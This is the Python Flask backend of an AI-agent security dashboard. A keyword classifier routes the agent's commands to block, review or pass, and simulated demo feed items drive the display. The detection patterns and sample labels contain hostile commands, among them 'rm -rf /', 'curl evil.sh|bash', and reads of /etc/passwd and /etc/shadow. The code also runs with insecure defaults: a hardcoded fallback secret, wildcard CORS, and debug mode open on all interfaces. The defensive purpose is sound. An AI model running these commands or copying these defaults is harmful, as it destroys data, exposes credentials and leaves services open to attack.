"""
AiSafeguard Control Center — Python Backend
=============================================
Flask + SocketIO application for real-time AI Agent security monitoring.

Architecture:
  - Flask serves the UI and REST API
  - SocketIO handles real-time event pushing (radar blips, log updates)
  - Backend integration points for actual security analysis

Usage:
  pip install -r requirements.txt
  python app.py
"""

import os
import re
import json
import time
import uuid
import random
import threading
from datetime import datetime
from dataclasses import dataclass, field, asdict
from enum import Enum
from typing import Optional

from flask import Flask, render_template, jsonify, request
from flask_socketio import SocketIO, emit

# ─── Configuration ───────────────────────────────────────────────────────────

app = Flask(__name__)
app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "aisafeguard-dev-key")

socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")


# ─── Data Models ─────────────────────────────────────────────────────────────

class ThreatLevel(str, Enum):
    BLOCKED = "blocked"
    HONEYPOT = "honeypot"
    WATCH = "watch"
    TRUSTED = "trusted"
    NORMAL = "normal"


class SourceType(str, Enum):
    INTERNAL = "internal"   # Agent Output — Open Claw's own actions
    EXTERNAL = "external"   # Human Input — user commands sent to Open Claw


@dataclass
class FeedItem:
    id: str = field(default_factory=lambda: str(uuid.uuid4()))
    type: str = "normal"
    label: str = ""
    source: str = ""
    source_type: str = "external"
    detail: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().strftime("%H:%M:%S"))

    def to_dict(self):
        return asdict(self)


@dataclass
class EventLog:
    time: str = ""
    type: str = ""
    message: str = ""
    result: str = ""  # "passed", "blocked", "pending"

    def to_dict(self):
        return asdict(self)


# ─── In-Memory State (replace with DB for production) ────────────────────────

class AppState:
    def __init__(self):
        self.stats = {"passed": 0, "blocked": 0, "reviewing": 0}
        self.events: list[dict] = []
        self.pending_queue: list[dict] = []
        self.chat_messages: list[dict] = []
        self.lock = threading.Lock()

    def add_event(self, event_type, label, source, result):
        with self.lock:
            ev = EventLog(
                time=datetime.now().strftime("%H:%M:%S"),
                type=event_type,
                message=f"{source} → {label}",
                result=result,
            ).to_dict()
            self.events.insert(0, ev)
            self.events = self.events[:100]  # Keep last 100
            return ev

    def update_stats(self, passed=0, blocked=0, reviewing=0):
        with self.lock:
            self.stats["passed"] += passed
            self.stats["blocked"] += blocked
            self.stats["reviewing"] += reviewing
            self.stats["reviewing"] = max(0, self.stats["reviewing"])
            return dict(self.stats)

    def add_pending(self, item: dict):
        with self.lock:
            self.pending_queue.append(item)

    def remove_pending(self, item_id: str):
        with self.lock:
            self.pending_queue = [p for p in self.pending_queue if p["id"] != item_id]

    def add_chat(self, role, text, status=None):
        with self.lock:
            msg = {"role": role, "text": text, "status": status}
            self.chat_messages.append(msg)
            return msg


state = AppState()


# ─── Threat Classification Engine ────────────────────────────────────────────

# Keyword patterns for classifying threat level
THREAT_PATTERNS = {
    ThreatLevel.BLOCKED: [
        r"rm\s", r"drop\s", r"delete", r"format\b", r"chmod\s*777",
        r"exploit", r"hack", r"inject", r"truncate", r"shutdown",
    ],
    ThreatLevel.HONEYPOT: [
        r"scan", r"probe", r"enum", r"backdoor", r"passwd",
        r"eval\(", r"nmap", r"metasploit",
    ],
    ThreatLevel.WATCH: [
        r"sudo", r"admin", r"export", r"exec", r"system",
        r"subprocess", r"wget", r"curl", r"pip\s+install",
    ],
    ThreatLevel.TRUSTED: [
        r"read", r"get", r"list", r"check", r"status",
        r"help", r"config", r"log", r"info", r"version",
    ],
}

FEED_LABELS = {
    "blocked":  ["rm -rf /", "DROP TABLE *", "curl evil.sh|bash", "chmod 777 /etc"],
    "honeypot": ["scan_ports", "read /etc/passwd", "wget backdoor", "eval(user_input)"],
    "watch":    ["subprocess.run()", 'open("/etc/shadow")', "requests.post(ext)", "os.system(cmd)"],
    "trusted":  ["read_config", "log_output", "return_result", "save_report"],
    "normal":   ["parse_input", "format_text", "calculate", "list_files"],
}

SOURCES_INTERNAL = ["Code Execution", "File Access", "Network Request", "System Call"]
SOURCES_EXTERNAL = ["User Prompt", "MCP Tool Call", "Plugin Request", "Third-party Agent"]


def classify_threat(command: str) -> ThreatLevel:
    """
    Classify a command string into a threat level.
    
    In production, replace this with your actual security analysis engine
    (e.g., LLM-based classification, rule engine, or ML model).
    """
    lc = command.lower()
    for level, patterns in THREAT_PATTERNS.items():
        for pattern in patterns:
            if re.search(pattern, lc, re.IGNORECASE):
                return level
    return ThreatLevel.NORMAL


def generate_random_feed() -> dict:
    """Generate a random feed item for simulation/demo purposes."""
    threat_type = random.choice(list(ThreatLevel)).value
    is_internal = random.random() > 0.5
    label = random.choice(FEED_LABELS[threat_type])
    source = random.choice(SOURCES_INTERNAL if is_internal else SOURCES_EXTERNAL)

    item = FeedItem(
        type=threat_type,
        label=label,
        source=source,
        source_type="internal" if is_internal else "external",
        detail=(
            f'Open Claw attempted to execute "{label}". Security net intercepted for evaluation.'
            if is_internal
            else f'Human issued command "{label}" to Open Claw. Verify intent before execution.'
        ),
    )
    return item.to_dict()


# ─── Routes — Pages ──────────────────────────────────────────────────────────

@app.route("/")
def index():
    """Serve the main Control Center UI."""
    return render_template("index.html")


# ─── Routes — REST API ───────────────────────────────────────────────────────

@app.route("/api/state", methods=["GET"])
def get_state():
    """Get current application state (stats, events, pending queue)."""
    return jsonify({
        "stats": state.stats,
        "events": state.events[:20],
        "pending": state.pending_queue,
        "chat": state.chat_messages[-50:],
    })


@app.route("/api/feed", methods=["POST"])
def submit_feed():
    """
    Submit a new feed item for processing.
    
    Body JSON:
      { "type": "blocked", "label": "rm -rf /", "source": "User Prompt",
        "source_type": "external", "detail": "..." }
    
    Or for auto-classification:
      { "command": "rm -rf /", "source_type": "external" }
    """
    data = request.get_json(force=True)

    if "command" in data:
        command = data["command"]
        threat = classify_threat(command)
        source_type = data.get("source_type", "external")
        source = data.get("source", "API Request")
        item = FeedItem(
            type=threat.value,
            label=command[:30],
            source=source,
            source_type=source_type,
            detail=f'Command: "{command}". Auto-classified as {threat.value.upper()}.',
        ).to_dict()
    else:
        item = FeedItem(
            type=data.get("type", "normal"),
            label=data.get("label", "unknown"),
            source=data.get("source", "API"),
            source_type=data.get("source_type", "external"),
            detail=data.get("detail", ""),
        ).to_dict()

    # Broadcast to all connected clients
    socketio.emit("new_blip", item)

    # Process result based on type
    threat_type = item["type"]
    if threat_type == "blocked":
        stats = state.update_stats(blocked=1)
        ev = state.add_event(threat_type, item["label"], item["source"], "blocked")
        socketio.emit("net_flash", {"zone": "outer"})
        socketio.emit("stats_update", stats)
        socketio.emit("new_event", ev)
    elif threat_type in ("honeypot", "watch"):
        stats = state.update_stats(reviewing=1)
        state.add_pending(item)
        socketio.emit("net_flash", {"zone": "inner"})
        socketio.emit("stats_update", stats)
        socketio.emit("pending_update", {"queue": state.pending_queue})
    else:
        stats = state.update_stats(passed=1)
        ev = state.add_event(threat_type, item["label"], item["source"], "passed")
        socketio.emit("eating_task", {})
        socketio.emit("stats_update", stats)
        socketio.emit("new_event", ev)

    return jsonify({"status": "ok", "item": item, "stats": state.stats})


@app.route("/api/review/<item_id>", methods=["POST"])
def review_item(item_id):
    """
    Approve or deny a pending item.
    
    Body JSON: { "action": "approve" } or { "action": "deny" }
    """
    data = request.get_json(force=True)
    action = data.get("action", "deny")

    # Find the item
    target = None
    for p in state.pending_queue:
        if p["id"] == item_id:
            target = p
            break

    if not target:
        return jsonify({"error": "Item not found"}), 404

    state.remove_pending(item_id)

    if action == "approve":
        stats = state.update_stats(reviewing=-1, passed=1)
        ev = state.add_event(target["type"], target["label"], target["source"], "passed")
        socketio.emit("eating_task", {})
    else:
        stats = state.update_stats(reviewing=-1, blocked=1)
        ev = state.add_event(target["type"], target["label"], target["source"], "blocked")

    socketio.emit("stats_update", stats)
    socketio.emit("new_event", ev)
    socketio.emit("pending_update", {"queue": state.pending_queue})
    socketio.emit("review_complete", {"id": item_id, "action": action})

    return jsonify({"status": "ok", "action": action, "stats": state.stats})


@app.route("/api/prompt", methods=["POST"])
def user_prompt():
    """
    Process a user prompt command.
    
    Body JSON: { "command": "get status" }
    """
    data = request.get_json(force=True)
    command = data.get("command", "").strip()
    if not command:
        return jsonify({"error": "Empty command"}), 400

    # Add user message
    user_msg = state.add_chat("user", command)
    socketio.emit("chat_message", user_msg)

    # Classify
    threat = classify_threat(command)

    # Create feed item
    item = FeedItem(
        type=threat.value,
        label=command[:30],
        source="User Prompt",
        source_type="external",
        detail=f'User command: "{command}". Verify before sending to Open Claw.',
    ).to_dict()

    socketio.emit("new_blip", item)

    # Generate response
    if threat == ThreatLevel.BLOCKED:
        response = f'Command "{command}" was intercepted by the outer security net. Classified as dangerous and blocked.'
        status = "blocked"
        stats = state.update_stats(blocked=1)
        ev = state.add_event("blocked", command[:20], "User Prompt", "blocked")
        socketio.emit("net_flash", {"zone": "outer"})
        socketio.emit("stats_update", stats)
        socketio.emit("new_event", ev)
    elif threat in (ThreatLevel.HONEYPOT, ThreatLevel.WATCH):
        response = f'Command "{command}" requires security review. Added to pending queue for manual approval.'
        status = "pending"
        stats = state.update_stats(reviewing=1)
        state.add_pending(item)
        socketio.emit("net_flash", {"zone": "inner"})
        socketio.emit("stats_update", stats)
        socketio.emit("pending_update", {"queue": state.pending_queue})
    else:
        response = f'Command "{command}" has been verified as safe and delivered to Open Claw for execution.'
        status = "passed"
        stats = state.update_stats(passed=1)
        ev = state.add_event(threat.value, command[:20], "User Prompt", "passed")
        socketio.emit("eating_task", {})
        socketio.emit("stats_update", stats)
        socketio.emit("new_event", ev)

    assistant_msg = state.add_chat("assistant", response, status)
    socketio.emit("chat_message", assistant_msg)

    return jsonify({"status": "ok", "threat": threat.value, "response": response})


@app.route("/api/classify", methods=["POST"])
def classify_command():
    """
    Classify a command without executing it.
    Useful for preview / dry-run.
    
    Body JSON: { "command": "rm -rf /" }
    Returns:   { "command": "rm -rf /", "threat_level": "blocked" }
    """
    data = request.get_json(force=True)
    command = data.get("command", "")
    threat = classify_threat(command)
    return jsonify({"command": command, "threat_level": threat.value})


# ─── SocketIO Events ─────────────────────────────────────────────────────────

@socketio.on("connect")
def handle_connect():
    """Client connected — send current state."""
    emit("init_state", {
        "stats": state.stats,
        "events": state.events[:20],
        "pending": state.pending_queue,
        "chat": state.chat_messages[-50:],
    })


@socketio.on("manual_feed")
def handle_manual_feed(data):
    """Client triggered a manual feed button."""
    threat_type = data.get("type", "normal")
    item = generate_random_feed()
    item["type"] = threat_type
    item["label"] = random.choice(FEED_LABELS.get(threat_type, ["unknown"]))

    emit("new_blip", item, broadcast=True)

    if threat_type == "blocked":
        stats = state.update_stats(blocked=1)
        ev = state.add_event(threat_type, item["label"], item["source"], "blocked")
        socketio.emit("net_flash", {"zone": "outer"})
        socketio.emit("stats_update", stats)
        socketio.emit("new_event", ev)
    elif threat_type in ("honeypot", "watch"):
        stats = state.update_stats(reviewing=1)
        state.add_pending(item)
        socketio.emit("net_flash", {"zone": "inner"})
        socketio.emit("stats_update", stats)
        socketio.emit("pending_update", {"queue": state.pending_queue})
    else:
        stats = state.update_stats(passed=1)
        ev = state.add_event(threat_type, item["label"], item["source"], "passed")
        socketio.emit("eating_task", {})
        socketio.emit("stats_update", stats)
        socketio.emit("new_event", ev)


@socketio.on("auto_feed_tick")
def handle_auto_feed(data):
    """Auto-feed tick from client."""
    item = generate_random_feed()
    emit("new_blip", item, broadcast=True)

    threat_type = item["type"]
    if threat_type == "blocked":
        stats = state.update_stats(blocked=1)
        ev = state.add_event(threat_type, item["label"], item["source"], "blocked")
        socketio.emit("net_flash", {"zone": "outer"})
        socketio.emit("stats_update", stats)
        socketio.emit("new_event", ev)
    elif threat_type in ("honeypot", "watch"):
        stats = state.update_stats(reviewing=1)
        state.add_pending(item)
        socketio.emit("net_flash", {"zone": "inner"})
        socketio.emit("stats_update", stats)
        socketio.emit("pending_update", {"queue": state.pending_queue})
    else:
        stats = state.update_stats(passed=1)
        ev = state.add_event(threat_type, item["label"], item["source"], "passed")
        socketio.emit("eating_task", {})
        socketio.emit("stats_update", stats)
        socketio.emit("new_event", ev)


# ─── Entry Point ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║           AiSafeguard Control Center                        ║
║           ─────────────────────────────                     ║
║  UI:  http://localhost:{port}                                ║
║  API: http://localhost:{port}/api/state                      ║
║                                                              ║
║  REST API Endpoints:                                         ║
║    POST /api/feed      — Submit a feed item                  ║
║    POST /api/prompt    — Send a user prompt                  ║
║    POST /api/review/ID — Approve/deny a pending item         ║
║    POST /api/classify  — Classify command (dry-run)          ║
║    GET  /api/state     — Get current state                   ║
║                                                              ║
║  SocketIO Events (real-time):                                ║
║    new_blip, stats_update, new_event, net_flash,             ║
║    eating_task, pending_update, chat_message                 ║
╚══════════════════════════════════════════════════════════════╝
    """)
    socketio.run(app, host="0.0.0.0", port=port, debug=True, allow_unsafe_werkzeug=True)
